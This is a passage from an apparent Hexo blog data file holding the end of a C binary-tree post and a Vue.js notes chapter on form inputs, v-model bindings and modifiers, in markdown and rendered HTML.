p-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    p-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">return</span> p;<br>&#125;<br><br>BiThrTree <span class=\"hljs-title function_\">InsertTreeLeftNode</span><span class=\"hljs-params\">(BiThrTree T,Elemtype x,BiThrTree parent)</span><br>&#123;<br>    BiThrTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No such a parent.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">if</span>((p=(BiThrTree*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BiThrTreeNode)))==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Empty tree.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    p-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">if</span>(parent-&gt;lchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        parent-&gt;lchild=p;<br>        parent-&gt;ltag=<span class=\"hljs-number\">0</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        p-&gt;lchild=parent-&gt;lchild;<br>        parent-&gt;lchild=p;<br>        parent-&gt;ltag=<span class=\"hljs-number\">0</span>;<br>    &#125;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Insert data %d to leftchild.\\n&quot;</span>,x);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br>BiThrTree <span class=\"hljs-title function_\">InsertTreeRightNode</span><span class=\"hljs-params\">(BiThrTree T,Elemtype x,BiThrTree parent)</span><br>&#123;<br>    BiThrTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No such a parent.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">if</span>((p=(BiThrTree*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BiThrTreeNode)))==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Empty tree.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p-&gt;data=x;<br>    p-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    p-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">if</span>(parent-&gt;rchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        parent-&gt;rchild=p;<br>        parent-&gt;rtag=<span class=\"hljs-number\">0</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        p-&gt;rchild=parent-&gt;rchild;<br>        parent-&gt;rchild=p;<br>        parent-&gt;rtag=<span class=\"hljs-number\">0</span>;<br>    &#125;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Insert data %d to rightchild.\\n&quot;</span>,x);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">MiddleOrderTree</span><span class=\"hljs-params\">(BiThrTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    MiddleOrderTree(T-&gt;lchild);<br>    Visit(T-&gt;data);<br>    MiddleOrderTree(T-&gt;rchild);<br><br>&#125;<br><br>BiThrTree <span class=\"hljs-title function_\">MiddleOrderThr</span><span class=\"hljs-params\">(BiThrTree T)</span><br><br>BiThrTree <span class=\"hljs-title function_\">DeleteTreeLeftNode</span><span class=\"hljs-params\">(BiThrTree T,BiThrTree parent)</span><br>&#123;<br>    BiThrTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>||parent-&gt;lchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No left child.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p=parent-&gt;lchild;<br>    parent-&gt;lchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-built_in\">free</span>(p);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br>BiThrTree <span class=\"hljs-title function_\">DeleteTreeRightNode</span><span class=\"hljs-params\">(BiThrTree T,BiThrTree parent)</span><br>&#123;<br>    BiThrTree p;<br>    <span class=\"hljs-keyword\">if</span>(parent==<span class=\"hljs-literal\">NULL</span>||parent-&gt;rchild==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No left child.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    p=parent-&gt;rchild;<br>    parent-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-built_in\">free</span>(p);<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">PreOrderTree</span><span class=\"hljs-params\">(BiThrTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    Visit(T-&gt;data);<br>    PreOrderTree(T-&gt;lchild);<br>    PreOrderTree(T-&gt;rchild);<br><br>&#125;<br><br><br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">LastOrderTree</span><span class=\"hljs-params\">(BiThrTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    LastOrderTree(T-&gt;lchild);<br>    LastOrderTree(T-&gt;rchild);<br>    Visit(T-&gt;data);<br><br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">LevelOrderTree</span><span class=\"hljs-params\">(BiThrTree T)</span><br>&#123;<br>    BiThrTree Queue[MAXNODE];<br>    <span class=\"hljs-type\">int</span> front,rear;<br><br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-keyword\">return</span>;<br>    &#125;<br>    front=<span class=\"hljs-number\">-1</span>;<br>    rear=<span class=\"hljs-number\">-1</span>;<br>    Queue[++rear]=T;<br>    <span class=\"hljs-keyword\">while</span>(front!=rear)<br>    &#123;<br>        Visit(Queue[++front]-&gt;data);<br>        <span class=\"hljs-keyword\">if</span>(Queue[front]-&gt;lchild!=<span class=\"hljs-literal\">NULL</span>)<br>        &#123;<br>            Queue[++rear]=Queue[front]-&gt;lchild;<br>        &#125;<br>        <span class=\"hljs-keyword\">if</span>(Queue[front]-&gt;rchild!=<span class=\"hljs-literal\">NULL</span>)<br>        &#123;<br>            Queue[++rear]=Queue[front]-&gt;rchild;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>    BiThrTree myTree;<br>    Elemtype rootData;<br>    <span class=\"hljs-type\">int</span> numberOfNodes,index,choice;<br><br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the node number:\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;numberOfNodes);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the data of root node:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;rootData);<br><br>    myTree=CreateTree(rootData);<br><br>    <span class=\"hljs-keyword\">for</span>(index=<span class=\"hljs-number\">1</span>; index&lt;numberOfNodes; index++)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No %d node&#x27;s position is:\\n1.Leftchild of Root.\\n2.Rightchild of Root.\\n3.Leftchild of the Root&#x27;s leftchild.\\n4.Rightchild of the Root&#x27;s leftchild.\\n5.Leftchild of the Root&#x27;s rightchild.\\n6.Rightchild of the Root&#x27;s rightchild.\\n&quot;</span>,index);<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Choice:&quot;</span>);<br>        <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;choice);<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the %d data:&quot;</span>,index);<br>        Elemtype nodedata;<br>        <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;nodedata);<br>        <span class=\"hljs-keyword\">switch</span>(choice)<br>        &#123;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">1</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">2</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">3</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree-&gt;lchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">4</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree-&gt;lchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">5</span>:<br>            myTree=InsertTreeLeftNode(myTree,nodedata,myTree-&gt;rchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">6</span>:<br>            myTree=InsertTreeRightNode(myTree,nodedata,myTree-&gt;rchild);<br>            <span class=\"hljs-keyword\">break</span>;<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Preorder:&quot;</span>);<br>    PreOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Middleorder:&quot;</span>);<br>    MiddleOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Postorder:&quot;</span>);<br>    LastOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Leverorder:&quot;</span>);<br>    LevelOrderTree(myTree);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-哈夫曼树\"><a href=\"#3-哈夫曼树\" class=\"headerlink\" title=\"3.哈夫曼树\"></a>3.哈夫曼树</h3>"},{"title":"Vue.js实战（4）","date":"2020-11-20T10:38:45.000Z","mp3":null,"cover":"img/vue_js_shizhan.jpg","_content":"\n\n# Ch6\n\n \n\n### 6.1 表单基本用法及常用小组件\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <script src=\"./js/vue.js\"></script>\n</head>\n<body>\n    <div id=\"app\">\n        <p>汉语非即时显示</p>\n        <textarea v-model=\"text\" placeholder=\"输入\"></textarea>\n        <p>Content1:{{ text }}</p>\n      \n       <p>汉语即时显示</p>\n        <input type=\"text\" @input=\"handleInput\" placeholder=\"输入2\">\n        <p>Content1:{{ text1 }}</p>\n\n        <p>单选框</p>\n        <!-- 单选框 -->\n        <input type=\"radio\" v-model=\"picked\" value=\"HTML\" id=\"html\">\n        <label for=\"html\">HTML</label>\n        <input type=\"radio\" v-model=\"picked\" value=\"JS\" id=\"js\">\n        <label for=\"html\">JavaScript</label>\n        <input type=\"radio\" v-model=\"picked\" value=\"CSS\" id=\"css\">\n        <label for=\"html\">CSS</label>\n\n        <span style=\"padding-left: 30px;\">Picked:{{ picked }}</span>\n        <br>\n        <!-- 复选框 -->\n        <p>复选框</p>\n        <input type=\"checkbox\" v-model=\"checked\" id=\"checked\" value=\"CSS\">\n        <label for=\"css\">CSS</label>\n        <input type=\"checkbox\" v-model=\"checked\" id=\"checked\" value=\"JS\">\n        <label for=\"\">JS</label>\n        <input type=\"checkbox\" v-model=\"checked\" id=\"checked\" value=\"HTML\">\n        <label for=\"html\">HTML</label>\n        <label for=\"checked\">已选：{{ checked }}</label>\n\n        <p>下拉框(单选)</p>\n        <select v-model=\"selected\">\n            <option>HTML</option>\n            <option>JS</option>\n            <option>CSS</option>\n        </select>\n        <label for=\"selected\">已选：{{ selected }}</label>\n\n        <p>下拉框(多选)</p>\n        <select v-model=\"selected1\" multiple>\n            <option>HTML</option>\n            <option>JS</option>\n            <option>CSS</option>\n        </select>\n        <label for=\"selected1\">已选：{{ selected1 }}</label>\n\n\n    </div>\n\n    <script>\n        var app=new Vue({\n            el:\"#app\",\n            data:{\n                text:'',\n                text1:'',\n                picked:'false',\n                checked:[''],\n                selected:'',\n                selected1:['']\n            },\n            computed:{\n\n            },\n            methods:{\n                handleInput:function(e){\n                    this.text1=e.target.value;\n                }\n            }\n        })\n    </script>\n</body>\n</html>\n```\n\n### 6.2 绑定值\n\n选中显示a,未选中显示b\n\n```html\n        <p>复选框：</p>\n        <input type=\"checkbox\" v-model=\"picked2\" :true-value=\"value1\" :false-value=\"value2\">\n        <label>复选框：</label>\n        <p>{{ picked2 }}</p>\n        <p>Value1:{{ value1 }}</p>\n        <p>Value2:{{ value2 }}</p>\n\n```\n\n### 6.3 修饰符\n\n​\t1 v-model.lazy 显示数据不是实时改变，回车或者失焦才会改变；\n\n```html\n      <p>.lazy</p>\n        <input type=\"text\" v-model.lazy=\"lazy\">\n        <p>Lazy:{{ lazy }}</p>\n```\n\n​\t2 v-model.number 将输入类型转换为Number类型，否则虽然输入的是数字，其实类型是字符串；若是输入字符，不显示；\n\n```html\n        <p>.numebr</p>\n        <input v-model.number=\"number\">\n        <p>number:{{ number }}</p>\n```\n\n​\t3 v-model.trim 去除首尾空白；\n\n```html\n  <p>.trim</p>\n        <input v-model.trim=\"trim\">\n        <p>trim:{{ trim }}</p> \n```\n\n","source":"_posts/Vue.js实战（4）.md","raw":"---\ntitle: Vue.js实战（4）\ndate: 2020-11-20 18:38:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\n    - Vue.js实战\nmp3: \ncover: img/vue_js_shizhan.jpg\n---\n\n\n# Ch6\n\n \n\n### 6.1 表单基本用法及常用小组件\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <script src=\"./js/vue.js\"></script>\n</head>\n<body>\n    <div id=\"app\">\n        <p>汉语非即时显示</p>\n        <textarea v-model=\"text\" placeholder=\"输入\"></textarea>\n        <p>Content1:{{ text }}</p>\n      \n       <p>汉语即时显示</p>\n        <input type=\"text\" @input=\"handleInput\" placeholder=\"输入2\">\n        <p>Content1:{{ text1 }}</p>\n\n        <p>单选框</p>\n        <!-- 单选框 -->\n        <input type=\"radio\" v-model=\"picked\" value=\"HTML\" id=\"html\">\n        <label for=\"html\">HTML</label>\n        <input type=\"radio\" v-model=\"picked\" value=\"JS\" id=\"js\">\n        <label for=\"html\">JavaScript</label>\n        <input type=\"radio\" v-model=\"picked\" value=\"CSS\" id=\"css\">\n        <label for=\"html\">CSS</label>\n\n        <span style=\"padding-left: 30px;\">Picked:{{ picked }}</span>\n        <br>\n        <!-- 复选框 -->\n        <p>复选框</p>\n        <input type=\"checkbox\" v-model=\"checked\" id=\"checked\" value=\"CSS\">\n        <label for=\"css\">CSS</label>\n        <input type=\"checkbox\" v-model=\"checked\" id=\"checked\" value=\"JS\">\n        <label for=\"\">JS</label>\n        <input type=\"checkbox\" v-model=\"checked\" id=\"checked\" value=\"HTML\">\n        <label for=\"html\">HTML</label>\n        <label for=\"checked\">已选：{{ checked }}</label>\n\n        <p>下拉框(单选)</p>\n        <select v-model=\"selected\">\n            <option>HTML</option>\n            <option>JS</option>\n            <option>CSS</option>\n        </select>\n        <label for=\"selected\">已选：{{ selected }}</label>\n\n        <p>下拉框(多选)</p>\n        <select v-model=\"selected1\" multiple>\n            <option>HTML</option>\n            <option>JS</option>\n            <option>CSS</option>\n        </select>\n        <label for=\"selected1\">已选：{{ selected1 }}</label>\n\n\n    </div>\n\n    <script>\n        var app=new Vue({\n            el:\"#app\",\n            data:{\n                text:'',\n                text1:'',\n                picked:'false',\n                checked:[''],\n                selected:'',\n                selected1:['']\n            },\n            computed:{\n\n            },\n            methods:{\n                handleInput:function(e){\n                    this.text1=e.target.value;\n                }\n            }\n        })\n    </script>\n</body>\n</html>\n```\n\n### 6.2 绑定值\n\n选中显示a,未选中显示b\n\n```html\n        <p>复选框：</p>\n        <input type=\"checkbox\" v-model=\"picked2\" :true-value=\"value1\" :false-value=\"value2\">\n        <label>复选框：</label>\n        <p>{{ picked2 }}</p>\n        <p>Value1:{{ value1 }}</p>\n        <p>Value2:{{ value2 }}</p>\n\n```\n\n### 6.3 修饰符\n\n​\t1 v-model.lazy 显示数据不是实时改变，回车或者失焦才会改变；\n\n```html\n      <p>.lazy</p>\n        <input type=\"text\" v-model.lazy=\"lazy\">\n        <p>Lazy:{{ lazy }}</p>\n```\n\n​\t2 v-model.number 将输入类型转换为Number类型，否则虽然输入的是数字，其实类型是字符串；若是输入字符，不显示；\n\n```html\n        <p>.numebr</p>\n        <input v-model.number=\"number\">\n        <p>number:{{ number }}</p>\n```\n\n​\t3 v-model.trim 去除首尾空白；\n\n```html\n  <p>.trim</p>\n        <input v-model.trim=\"trim\">\n        <p>trim:{{ trim }}</p> \n```\n\n","slug":"Vue.js实战（4）","published":1,"updated":"2020-11-27T13:22:30.000Z","_id":"clg29vyh7003mao9c8pevcnun","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Ch6\"><a href=\"#Ch6\" class=\"headerlink\" title=\"Ch6\"></a>Ch6</h1><h3 id=\"6-1-表单基本用法及常用小组件\"><a href=\"#6-1-表单基本用法及常用小组件\" class=\"headerlink\" title=\"6.1 表单基本用法及常用小组件\"></a>6.1 表单基本用法及常用小组件</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">&quot;en&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;viewport&quot;</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Document<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;./js/vue.js&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>汉语非即时显示<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">textarea</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;text&quot;</span> <span class=\"hljs-attr\">placeholder</span>=<span class=\"hljs-string\">&quot;输入&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">textarea</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>Content1:&#123;&#123; text &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>      <br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>汉语即时显示<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;text&quot;</span> @<span class=\"hljs-attr\">input</span>=<span class=\"hljs-string\">&quot;handleInput&quot;</span> <span class=\"hljs-attr\">placeholder</span>=<span class=\"hljs-string\">&quot;输入2&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>Content1:&#123;&#123; text1 &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>单选框<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>        <span class=\"hljs-comment\">&lt;!-- 单选框 --&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;radio&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;picked&quot;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;HTML&quot;</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;html&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;html&quot;</span>&gt;</span>HTML<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;radio&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;picked&quot;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;JS&quot;</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;js&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;html&quot;</span>&gt;</span>JavaScript<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;radio&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;picked&quot;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;CSS&quot;</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;css&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;html&quot;</span>&gt;</span>CSS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">style</span>=<span class=\"hljs-string\">&quot;padding-left: 30px;&quot;</span>&gt;</span>Picked:&#123;&#123; picked &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><br>        <span class=\"hljs-comment\">&lt;!-- 复选框 --&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>复选框<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;checkbox&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;checked&quot;</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;checked&quot;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;CSS&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;css&quot;</span>&gt;</span>CSS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;checkbox&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;checked&quot;</span> <span 